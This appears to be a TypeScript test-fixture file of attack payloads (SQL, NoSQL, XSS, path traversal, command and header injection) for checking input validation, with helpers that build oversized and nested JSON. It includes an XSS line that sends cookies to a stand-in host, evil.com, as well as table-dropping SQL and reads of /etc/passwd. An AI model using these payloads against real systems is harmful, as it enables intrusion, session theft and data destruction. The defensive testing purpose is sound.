/**
 * Security Test Payloads
 *
 * Contains various attack payloads for testing input validation
 * and security measures against common attack vectors.
 */

/**
 * SQL Injection Payloads
 * Based on OWASP SQL Injection Testing Guide
 */
export const SQL_INJECTION_PAYLOADS = [
  // Classic SQL injection
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "1; SELECT * FROM users",
  "admin'--",
  "1 UNION SELECT * FROM users",
  
  // Blind SQL injection
  "1' AND 1=1--",
  "1' AND 1=2--",
  "1' AND SLEEP(5)--",
  
  // Time-based blind injection
  "1'; WAITFOR DELAY '0:0:5'--",
  "1' AND BENCHMARK(10000000,MD5('test'))--",
  
  // Union-based injection
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT username,password FROM users--",
  "-1 UNION SELECT 1,2,3,4,5,6--",
  
  // Error-based injection
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  
  // Stacked queries
  "'; INSERT INTO users VALUES('hacker','password'); --",
  "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
  
  // Comment variations
  "admin'/*",
  "admin'#",
  "admin'-- -",
  
  // Null byte injection
  "admin\x00'--",
  
  // Encoding variations
  "admin%27--",
  "admin%2527--",
];

/**
 * XSS (Cross-Site Scripting) Payloads
 * Based on OWASP XSS Filter Evasion Cheat Sheet
 */
export const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert("xss")</script>',
  '<script>alert(document.cookie)</script>',
  '<script>fetch("http://evil.com?c="+document.cookie)</script>',
  
  // Event handler injection
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  '<body onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<marquee onstart=alert("xss")>',
  '<video><source onerror=alert("xss")>',
  '<details open ontoggle=alert("xss")>',
  
  // JavaScript URI
  'javascript:alert("xss")',
  'javascript:alert(document.domain)',
  
  // Data URI
  'data:text/html,<script>alert("xss")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=',
  
  // HTML injection
  '<iframe src="javascript:alert(\'xss\')">',
  '<object data="javascript:alert(\'xss\')">',
  '<embed src="javascript:alert(\'xss\')">',
  
  // CSS injection
  '<style>@import "http://evil.com/xss.css";</style>',
  '<div style="background:url(javascript:alert(\'xss\'))">',
  
  // SVG injection
  '<svg><script>alert("xss")</script></svg>',
  '<svg><animate onbegin=alert("xss") attributeName=x dur=1s>',
  
  // Encoding evasion
  '\\x3cscript\\x3ealert("xss")\\x3c/script\\x3e',
  '&#x3C;script&#x3E;alert("xss")&#x3C;/script&#x3E;',
  '<scr\\x00ipt>alert("xss")</scr\\x00ipt>',
  
  // Case variation
  '<ScRiPt>alert("xss")</ScRiPt>',
  '<SCRIPT>alert("xss")</SCRIPT>',
  
  // Null byte injection
  '<scr\x00ipt>alert("xss")</script>',
  
  // Template literal injection
  '${alert("xss")}',
  '{{constructor.constructor("alert(1)")()}}',
];

/**
 * NoSQL Injection Payloads
 * For MongoDB and similar NoSQL databases
 */
export const NOSQL_INJECTION_PAYLOADS = [
  // Operator injection
  { $ne: null },
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  
  // Query object injection (as strings for URL params)
  'status[$ne]=CANCELLED',
  'status[$gt]=',
  'username[$regex]=.*',
  'password[$exists]=true',
  
  // JavaScript injection (MongoDB)
  '"; return true; var a="',
  "'; return '' == '",
  '1; return true',
  
  // Array injection
  { $in: [1, 2, 3] },
  { $nin: ['banned'] },
  
  // Aggregation pipeline injection
  { $lookup: { from: 'users', as: 'data' } },
];

/**
 * Path Traversal Payloads
 * For testing file path security
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  // Basic traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  
  // Encoded variations
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc/passwd',
  
  // Unicode encoding
  '..%u2216..%u2216etc/passwd',
  
  // Null byte (for extension bypass)
  '../../../etc/passwd%00.png',
  '../../../etc/passwd\x00.pdf',
  
  // Double encoding
  '..%252f..%252f..%252fetc/passwd',
  
  // Overlong UTF-8
  '..%c0%ae%c0%ae%c0%afetc/passwd',
  
  // Mixed techniques
  '....//....//....//etc/passwd',
  '..../..../..../etc/passwd',
  '..\\../..\\../etc/passwd',
];

/**
 * Command Injection Payloads
 * For testing OS command injection
 */
export const COMMAND_INJECTION_PAYLOADS = [
  // Basic command injection
  '; ls -la',
  '| cat /etc/passwd',
  '`id`',
  '$(whoami)',
  
  // Chained commands
  '; id; uname -a',
  '&& cat /etc/passwd',
  '|| cat /etc/passwd',
  
  // Background execution
  '; sleep 10 &',
  '| nohup id > /tmp/out &',
  
  // Newline injection
  '\nid',
  '\r\nid',
  '%0aid',
  
  // Backtick injection
  '`cat /etc/passwd`',
  
  // Windows commands
  '& dir',
  '| type C:\\Windows\\win.ini',
  '\r\nping -n 10 127.0.0.1',
];

/**
 * Header Injection Payloads
 * For testing HTTP header injection
 */
export const HEADER_INJECTION_PAYLOADS = [
  // CRLF injection
  'value\r\nX-Injected: header',
  'value%0d%0aX-Injected:%20header',
  'value%0aX-Injected:%20header',
  
  // Host header injection
  'evil.com',
  'localhost@evil.com',
  'evil.com/path',
  
  // Cookie injection
  'value; Set-Cookie: evil=value',
];

/**
 * Generate an oversized payload of specified size
 */
export function generateOversizedPayload(sizeInBytes: number): string {
  return 'x'.repeat(sizeInBytes);
}

/**
 * Check if a payload was properly sanitized in the response
 */
export function isPayloadSanitized(
  originalPayload: string,
  responseContent: string
): boolean {
  // Check if dangerous characters are escaped or removed
  const dangerousPatterns = [
    '<script',
    'onerror=',
    'onload=',
    'javascript:',
    '\'--',
    '; DROP',
    'UNION SELECT',
  ];
  
  const lowercaseResponse = responseContent.toLowerCase();
  const lowercasePayload = originalPayload.toLowerCase();
  
  // If the exact payload appears in the response, it's not sanitized
  if (responseContent.includes(originalPayload)) {
    // Check if it's properly escaped
    return dangerousPatterns.every(
      pattern => !lowercaseResponse.includes(pattern)
    );
  }
  
  return true;
}

/**
 * Generate a large JSON payload for testing request size limits
 */
export function generateLargeJsonPayload(sizeInMB: number): object {
  const targetSize = sizeInMB * 1024 * 1024;
  const data: string[] = [];
  let currentSize = 0;
  
  while (currentSize < targetSize) {
    const chunk = 'x'.repeat(1000);
    data.push(chunk);
    currentSize += chunk.length;
  }
  
  return { data };
}

/**
 * Generate payload with deeply nested JSON
 */
export function generateDeeplyNestedJson(depth: number): object {
  let obj: Record<string, unknown> = { value: 'bottom' };
  for (let i = 0; i < depth; i++) {
    obj = { nested: obj };
  }
  return obj;
}
